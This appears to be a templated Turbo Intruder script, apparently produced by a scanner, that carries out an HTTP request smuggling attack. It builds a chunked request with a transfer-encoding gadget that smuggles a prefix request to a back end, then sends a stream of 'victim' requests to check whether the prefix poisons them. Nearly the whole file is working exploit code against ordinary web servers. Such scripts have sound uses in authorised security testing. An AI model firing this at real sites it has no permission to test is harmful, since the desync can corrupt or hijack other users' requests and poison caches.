import random
random.seed()

RN = "\r\n"
host = "{{ .Host }}"
num_attacks = 1
num_victim = 30
sleep = 0.01 # Time to sleep between victim requests

# The transfer encoding header to use to cause a desync
smuggle_gadget = "{{ .Mutation }}"
smuggle_method = "{{ .Method }}"
smuggle_path = "{{ .Path }}"
smuggle_host = host
smuggle_headers = [
    "Connection: close",
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246n",
]

# The prefix for a victim
prefix_method = "POST"
prefix_path = "/404"
prefix_host = host
prefix_headers = []
prefix_tail_header = None # Set to None if using a body
prefix_body = "x=1" # If the prefix_body isn't set, then the newlines required for it won't be added to the prefix request

# The standard request sent by a normal user
victim_method = "GET"
victim_path = "/?smugglecb=__CB__"
victim_host = host
victim_headers = []
victim_body = None

# Build the prefix
prefix = "{} {} HTTP/1.1".format(prefix_method, prefix_path) + RN
if prefix_host is not None:
    prefix += "Host: {}".format(prefix_host) + RN

for header in prefix_headers:
    prefix += header + RN

# Either add a header to ignore stuff, or allow for a body to be added
if prefix_tail_header is not None:
    prefix += prefix_tail_header
else:
    prefix += RN
    if prefix_body is not None:
        prefix += prefix_body

# Build the smuggle request
smuggle_req = "{} {} HTTP/1.1".format(smuggle_method, smuggle_path) + RN
smuggle_req += smuggle_gadget + RN
smuggle_req += "Host: {}".format(smuggle_host) + RN
smuggle_req += "content-length: 3" + RN # Avoid turbo intruder auto fixing by going lowercase
for header in smuggle_headers:
    smuggle_req += header + RN

smuggle_req += RN

chunk_len = hex(len(prefix))[2:]
smuggle_req += chunk_len + RN
smuggle_req += prefix + RN
smuggle_req += "0" + RN
smuggle_req += RN

# Build the standard victim trial request
victim_req = "{} {} HTTP/1.1".format(victim_method, victim_path) + RN
victim_req += "Host: {}".format(victim_host) + RN
for header in victim_headers:
    victim_req += header + RN

if victim_body is None:
    victim_req += RN
else:
    victim_req += "Content-Length: {}".format(str(len(victim_body)))
    victim_req += RN
    victim_req += victim_body

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=5,
                           requestsPerConnection=1, # if you increase this from 1, you may get false positives
                           resumeSSL=False,
                           timeout=10,
                           pipeline=False,
                           maxRetriesPerRequest=0,
                           engine=Engine.THREADED,
                          )

    for _ in range(num_attacks):
        engine.queue(smuggle_req.replace("__CB__", str(random.random())), label="smuggle")

    for _ in range(num_victim):
        engine.queue(victim_req.replace("__CB__", str(random.random())), label="victim")
        time.sleep(sleep)

def handleResponse(req, interesting):
    table.add(req)
